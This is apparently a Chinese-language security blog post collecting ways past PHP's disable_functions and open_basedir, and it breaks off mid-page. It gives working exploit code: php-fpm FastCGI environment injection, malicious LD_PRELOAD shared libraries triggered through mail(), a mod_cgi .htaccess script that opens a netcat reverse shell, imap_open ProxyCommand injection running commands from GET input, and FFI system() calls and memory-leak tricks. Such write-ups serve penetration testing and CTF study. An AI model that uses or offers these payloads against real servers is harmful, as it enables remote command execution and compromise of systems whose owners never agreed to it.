id="利用php-fpm未授权访问漏洞"><a href="#利用php-fpm未授权访问漏洞" class="headerlink" title="利用php-fpm未授权访问漏洞"></a>利用php-fpm未授权访问漏洞</h2><h3 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p><p><a href="https://xz.aliyun.com/t/5598" target="_blank" rel="noopener">浅析php-fpm的攻击方式</a></p><h3 id="什么是php-fpm"><a href="#什么是php-fpm" class="headerlink" title="什么是php-fpm"></a>什么是php-fpm</h3><p>php-fpm是php官方的fastcgi解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><p>说到fastcgi,就必须先讲一下cgi</p><p>cgi的历史:</p><blockquote><p>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？<br>为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p></blockquote><p>Fast-CGI:</p><p>虽然cgi解决php解释器与webserver的通信问题，但是webserver每收到一个请求就会去fork一个cgi进程,请求结束再kill掉这个进程,这样会很浪费资源,于是出现了cgi的改良版本。</p><blockquote><p>fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p></blockquote><p>php-fpm 是一个Fastcgi的实现,并提供进程管理功能。</p><p>进程包含了master进程和worker进程</p><p>master进程只有一个,负责监听端口(一般是9000)接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个php解释器,是php代码真正执行的地方。</p><p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p><p>上面第一个是主进程,下面两个是worker进程。</p><h3 id="服务器利用fastcgi的通信过程"><a href="#服务器利用fastcgi的通信过程" class="headerlink" title="服务器利用fastcgi的通信过程"></a>服务器利用fastcgi的通信过程</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>record具有固定的结构。</p><pre><code class="c">typedef struct {  /* Header */  unsigned char version; // 版本  unsigned char type; // 本次record的类型  unsigned char requestIdB1; // 本次record对应的请求id  unsigned char requestIdB0;  unsigned char contentLengthB1; // body体的大小  unsigned char contentLengthB0;  unsigned char paddingLength; // 额外块大小  unsigned char reserved;   /* Body */  unsigned char contentData[contentLength];  unsigned char paddingData[paddingLength];} FCGI_Record;</code></pre><p>而其中的<code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p><p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p><p>借用<a href="http://blog.csdn.net/shreck66/article/details/50355729" target="_blank" rel="noopener">该文章</a>中的一个表格，列出最主要的几种<code>type</code>：</p><p><img src="https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png" alt="image5295"></p><p>根据这个表格我们可以猜测，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p><p>我们要关注的重点就是type=4的部分,也就是是设置环境变量的地方。</p><p>php里有很多有趣的设置,像文件包含里常用的php设置<code>auto_prepared_file,auto_append_file</code></p><p>我们令<code>auto_prepared_file=php://input</code>且<code>allow_url_include=On</code></p><p>那么我们该如何利用fastcgi来设置php的环境变量</p><p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p><p>结构体实例:</p><pre><code class="php">array(        &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,        &#39;REQUEST_METHOD&#39; =&gt; &#39;POST&#39;,        &#39;SCRIPT_FILENAME&#39; =&gt; &#39;/var/www/html/index.php&#39;,        &#39;SERVER_SOFTWARE&#39; =&gt; &#39;php/fcgiclient&#39;,        &#39;REMOTE_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,        &#39;REMOTE_PORT&#39; =&gt; &#39;9985&#39;,        &#39;SERVER_ADDR&#39; =&gt; &#39;127.0.0.1&#39;,        &#39;SERVER_PORT&#39; =&gt; &#39;80&#39;,        &#39;SERVER_NAME&#39; =&gt; &#39;mag-tured&#39;,        &#39;SERVER_PROTOCOL&#39; =&gt; &#39;HTTP/1.1&#39;,        &#39;CONTENT_TYPE&#39; =&gt; &#39;application/x-www-form-urlencoded&#39;,        &#39;CONTENT_LENGTH&#39; =&gt; strlen($content),        &#39;PHP_VALUE&#39; =&gt;&#39;auto_append_file=php://input&#39;,        &#39;PHP_ADMIN_VALUE&#39;=&gt;&#39;allow_url_include=On&#39;    )</code></pre><h3 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h3><p>这个原理的漏洞原因是PHP-FPM未授权访问漏洞,php-fpm没有对发送数据的来源进行验证,导致只要我们向php-fpm发送符合格式的数据就可以被解析.再结合fastcgi设置环境变量的部分来达到getshell</p><h3 id="fpm利用脚本"><a href="#fpm利用脚本" class="headerlink" title="fpm利用脚本"></a>fpm利用脚本</h3><p>分享个p牛脚本里面的一个client客户端: <a href="https://github.com/wuyunfeng/Python-FastCGI-Client" target="_blank" rel="noopener">Python FastCGI Client</a><br>还有Lz1y师傅给的一个php客户端 <a href="https://github.com/adoy/PHP-FastCGI-Client.git" target="_blank" rel="noopener">PHP FastCGI Client</a></p><p>还要php语言客户端: <a href="http://nullget.sourceforge.net/?q=node/795&lang=zh-hans" target="_blank" rel="noopener">fastcgi客户端PHP语言实现</a></p><h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><h3 id="send-mail"><a href="#send-mail" class="headerlink" title="send_mail"></a>send_mail</h3><p>这里我们先来看一下原理，首先什么是LD_PRELOAD？</p><p>google给出如下定义</p><pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p><p>而putenv可以设置环境变量</p><pre><code class="php">putenv ( string $setting ) : bool</code></pre><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p><p>那么我们可以进行一下骚操作</p><blockquote><p>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library</p></blockquote><h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p><code>putenv,errorlog,mail</code></p><h4 id="如何制作shared-libraries"><a href="#如何制作shared-libraries" class="headerlink" title="如何制作shared libraries"></a>如何制作shared libraries</h4><p>选择要替换的函数我们这里选取geteuid()</p><p>理由是php的mail()函数会调用系统的sendmail命令而sendmail命令会调用getuid()这个函数,所以我们确定目标为geteuid函数</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() {    system(&quot;ls &gt; result.txt&quot;);    }    int  geteuid() {    if (getenv(&quot;LD_PRELOAD&quot;) == NULL)     { return 0; }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();      }</code></pre><p>当这个共享库中的 <code>geteuid</code> 被调用时，尝试加载 <code>payload()</code> 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：</p><pre><code>gcc -c -fPIC hack.c -o hackgcc -shared hack -o hack.so</code></pre><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>将恶意的.so文件上传到服务器</p><p>执行如下代码,即可载入恶意命令</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=/var/www/hack.so&quot;);mail(&quot;[email protected]&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);?&gt;</code></pre><h4 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h4><p><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p><p>[<a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a href="https://www.k0rz3n.com/2019/02/12/PHP" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/02/12/PHP</a> 中可以利用的危险的函数/#8-mail-第五个参数-excrt-cmd)</p><p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p><h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#Method2——劫持启动进程" target="_blank" rel="noopener">参考链接</a> </p><blockquote><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p><p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p><p>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p></blockquote><h4 id="由于open-basedir-web目录不可写绕过"><a href="#由于open-basedir-web目录不可写绕过" class="headerlink" title="由于open_basedir+web目录不可写绕过"></a>由于open_basedir+web目录不可写绕过</h4><p>见 bypass open_basedir 的 tmpfile部分</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>bypass_disablefunc.c</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void){    // get command line options and arg    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);    // unset environment variable LD_PRELOAD.    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some     // distribution (e.g., centos), I need crafty trick.    int i;    for (i = 0; environ[i]; ++i) {            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) {                    environ[i][0] = &#39;\0&#39;;            }    }    // executive command    system(cmdline);}</code></pre><p>接着用以下语句编译C文件为共享对象文件：</p><pre><code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</code></pre><p>bypass_disablefunc.php，代码和test.php一致：</p><pre><code class="php">&lt;?php    $cmd = &quot;ls&quot;;    $out_path = &quot;/tmp/cmdout&quot;;    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    $so_path = &quot;/var/www/html/bypass_disablefunc.so&quot;;    putenv(&quot;LD_PRELOAD=&quot; . $so_path);    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;     unlink($out_path);?&gt;</code></pre><h2 id="apache-php-cgi-mod攻击"><a href="#apache-php-cgi-mod攻击" class="headerlink" title="apache+php cgi mod攻击"></a>apache+php cgi mod攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>php作为cgi模式运行的时候，接受-s  -d -c 这样的参数，我们看看这些参数的功能</p><pre><code class="html">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</code></pre><p>然后再看看攻击代码片段</p><pre><code class="php">char poststr[] = &quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot; \ &quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot; \ &quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot; \ &quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot; \ &quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot; \ &quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot; \ &quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot; \ &quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot; \ &quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot; \ &quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot; \ &quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot; \ &quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot; \</code></pre><p>解码出来是</p><pre><code class="php">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=&quot;&quot; -d open_basedir=none -d auto_prepend_file=php://input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</code></pre><p>这样Kingcope的攻击代码思路就出来了。</p><p>关闭各种防护的参数，打开各种危险的参数，最后利用auto_prepend_file（或auto_append_file）这个参数把黑客需要执行的系统命令传递过去了。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、apache+php是用cgi模式跑的，例如apache的mod_cgid</p><p>2、php解释器需要可以从下面的url访问到，当然或许可能是其他的url，这个具体要看你的配置</p><pre><code class="html">    /cgi-bin/php    /cgi-bin/php5    /cgi-bin/php-cgi    /cgi-bin/php.cgi    /cgi-bin/php4</code></pre><p>3、php版本<br>PHP版本小于5.3.12<br>PHP版本小于5.4.2</p><p>或者</p><ol><li>mod_cgi已经启用 </li><li>必须允许.htaccess文件 , 在httpd.conf中，要注意AllowOverride选项为All </li><li>必须有权限写.htaccess文件</li></ol><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><pre><code class="php">&lt;?php$cmd = &quot;nc -c&#39;/bin/bash&#39; 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500$shellfile .=&quot;$cmd&quot;; functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter{    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;}if(!isset($_GET[&#39;checked&#39;])){    @file_put_contents(&#39;.htaccess&#39;,&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND);     header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;]. &#39;?checked=true&#39;); //执行环境的检查}else{    $modcgi = in_array(&#39;mod_cgi&#39;,apache_get_modules()); // 检测mod_cgi是否开启    $writable = is_writable(&#39;.&#39;); //检测当前目录是否可写    $htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]);//检测是否启用了.htaccess        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))    {        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件    }    else    { checkEnabled(&quot;Backing up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in .htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccesscheckEnabled(&quot;Write .htaccessfile&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options +ExecCGI\nAddHandlercgi-script .dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名        checkEnabled(&quot;Write shellfile&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限        echo &quot;Executing the script now.Check your listener &lt;img src = &#39;shell.dizzle&#39; style =&#39;display:none;&#39;&gt;&quot;; //调用    }}?&gt;</code></pre><h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote><p>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。 </p></blockquote><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>存在ssh和rsh功能 且  enable_insecure_rsh = true</p><h3 id="利用脚本-未测试"><a href="#利用脚本-未测试" class="headerlink" title="利用脚本(未测试)"></a>利用脚本(未测试)</h3><pre><code class="php">if (!function_exists(&#39;imap_open&#39;)) {        die(&quot;no imap_open function!&quot;);}$server = &quot;x -oProxyCommand=echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64\t-d|sh}&quot;;//$server = &#39;x -oProxyCommand=echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;/tmp/cmd_result&quot;) . &#39;|base64$IFS$()-d|sh}&#39;;imap_open(&#39;{&#39; . $server . &#39;:143/imap}INBOX&#39;, &#39;&#39;, &#39;&#39;); // or var_dump(&quot;\n\nError: &quot;.imap_last_error());sleep(5);echo file_get_contents(&quot;/tmp/cmd_result&quot;);</code></pre><h2 id="利用pcntl插件绕过"><a href="#利用pcntl插件绕过" class="headerlink" title="利用pcntl插件绕过"></a>利用pcntl插件绕过</h2><pre><code>pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));</code></pre><h2 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h2><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>FFI::load 无视 opeb_basedir 可以直接加载文件</p><p>FFI 相对于 php 更加底层，可以泄露内存</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre><code class="php">$ffi=FFI::cdef(&quot;int system(char *command);&quot;,&quot;libc.so.6&quot;);$ffi-&gt;system(&quot;sleep 5&quot;);</code></pre><h3 id="open-basedir，禁用FFI-cdef，目录无法写文件命令执行"><a href="#open-basedir，禁用FFI-cdef，目录无法写文件命令执行" class="headerlink" title="open_basedir，禁用FFI::cdef，目录无法写文件命令执行"></a>open_basedir，禁用FFI::cdef，目录无法写文件命令执行</h3><pre><code>$value=&lt;&lt;&lt;EOF#define FFI_SCOPE &quot;DUMMY&quot;#define FFI_LIB &quot;libc.so.6&quot;int system(const char *command);EOF;$tmpHandle = tmpfile();$metaDatas = stream_get_meta_data($tmpHandle);$tmpFilename = $metaDatas[&#39;uri&#39;];fwrite($tmpHandle, $value);fseek($tmpHandle, 0);echo fread($tmpHandle, 1024);var_dump($tmpFilename);fflush($tmpHandle );$ffi=FFI::load($tmpFilename);$ffi-&gt;system(&#39;echo bypass_disable_function &gt; /tmp/testing&#39;);fclose($tmpHandle);</code></pre><h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));$a=FFI::string($b-400000,400000);var_dump($a);</code></pre><h2 id="php-json-bypass"><a href="#php-json-bypass" class="headerlink" title="php-json-bypass"></a>php-json-bypass</h2><p><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p><h2 id="php7-backtrace-bypass"><a href="#php7-backtrace-bypass" class="headerlink" title="php7-backtrace-bypass"></a><strong>php7-backtrace-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a> </p><h2 id="php7-gc-bypass"><a href="#php7-gc-bypass" class="headerlink" title="php7-gc-bypass"></a><strong>php7-gc-bypass</strong></h2><p> <a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a> </p><h2 id="win-shell-execute"><a href="#win-shell-execute" class="headerlink" title="win_shell_execute"></a>win_shell_execute</h2><pre><code class="php">if (!extension_loaded(&quot;win32std&quot;)) die(&quot;win32std extension required!&quot;);system(&quot;cmd.exe&quot;); //just to be sure that protections work wellwin_shell_execute(&quot;..\\..\\..\\..\\windows\\system32\\cmd.exe&quot;);</code></pre><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a href="https://www.freebuf.com/articles/web/169156.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/169156.html</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> <a href="https://www.anquanke.com/post/id/197745#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h3-5</a> </p><p> <a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法" target="_blank" rel="noopener">浅谈几种Bypass-disable-functions的方法</a> </p><h1 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass  open_basedir"></a>bypass  open_basedir</h1><h2 id="tmpfile绕过open-basedir在-tmp目录写文件"><a href="#tmpfile绕过open-basedir在-tmp目录写文件" class="headerlink" title="tmpfile绕过open_basedir在/tmp目录写文件"></a>tmpfile绕过open_basedir在/tmp目录写文件</h2><pre><code>&lt;?php$value=&lt;&lt;&lt;EOFEOF;$tmpHandle = tmpfile();$metaDatas = stream_get_meta_data($tmpHandle);$tmpFilename = $metaDatas[&#39;uri&#39;];fwrite($tmpHandle, $value);fseek($tmpHandle, 0);echo fread($tmpHandle, 1024);var_dump($tmpFilename);fflush($tmpHandle );fclose($tmpHandle);</code></pre><h2 id="ini-set与chdir-绕过open-basedir"><a href="#ini-set与chdir-绕过open-basedir" class="headerlink" title="ini_set与chdir 绕过open_basedir"></a>ini_set与chdir 绕过open_basedir</h2><pre><code class="php">mkdir(&#39;img&#39;);chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></pre><h2 id="glob协议列根目录"><a href="#glob协议列根目录" class="headerlink" title="glob协议列根目录"></a>glob协议列根目录</h2><pre><code class="php">$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach ($it as $f){    echo $f-&gt;__toString().&quot; &quot;;}</code></pre><h2 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h2><p>realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了<code>open_basedir</code>的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在<code>open_basedir</code>里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，所以这个时候就可以类似于报错盲注去爆出文件名了<br>这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点</p><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;,dirname(__FILE__));printf(&quot;open_basedir: %s&lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexist&#39;);$dir = &#39;d:/test/&#39;;$file = &#39;&#39;;$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#39;;for ($i=0; $i&lt;strlen($chars); $i++){    $file = $dir.$chars[$i].&#39;&lt;&lt;&#39;;    realpath($file);}function isexist($errno, $errstr){    $regex = &#39;/File\((.*)\) is not within/&#39;;    printf(&quot;errstr: %s &lt;br/&gt;&quot;,$errstr);    preg_match($regex, $errstr, $mathes);    if (isset($mathes[1])){        printf(&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;, $mathes[1]);    }}</code></pre><h2 id="SplFileInfo-getRealPath列目录"><a href="#SplFileInfo-getRealPath列目录" class="headerlink" title="SplFileInfo::getRealPath列目录"></a>SplFileInfo::getRealPath列目录</h2><p> SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的<code>realpath</code>很相似，就是<code>getRealPath</code>，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了<code>open_basedir</code>的设定 </p><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;, ini_get(&#39;open_basedir&#39;));$basedir = &#39;d:/test/&#39;;$arr = array();$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789&#39;;for ($i=0; $i &lt; strlen($chars); $i++) {    $info = new SplFileInfo($basedir . $chars[$i] . &#39;&lt;&lt;&#39;);    $re = $info-&gt;getRealPath();    if ($re) {        echo $re.&quot;&lt;br&gt;&quot;;    }}</code></pre><h2 